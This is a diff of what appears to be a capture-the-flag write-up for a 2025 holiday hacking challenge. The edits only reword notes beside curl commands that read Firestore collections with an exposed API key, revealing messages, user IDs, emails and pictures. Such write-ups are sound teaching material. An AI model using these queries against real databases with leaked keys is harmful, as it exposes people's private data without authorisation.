@@ -116,21 +116,21 @@ Following the comment in the page code, let's see what collections are accessibl
 curl -X GET https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
 </code></pre>  
 <p>
-Collection contains messages, gnome names, and sender UIDS
+The DMS collection contains messages, gnome names, and sender UIDS
 <br>
 </p>
 <pre><code class="language-sh">
 curl -X GET https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
 </code></pre>  
 <p>
-Collection contains avatars, authids,
+The TEA collection contains avatars, authids,
 <br>
 </p>
 <pre><code class="language-sh">
 curl -X GET https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
 </code></pre>  
 <p>
-Collection contains email addresses, notes and jpeg pictures
+The Gnomes collection contains email addresses, notes and jpeg pictures
 <br>
 </p>
 <p>
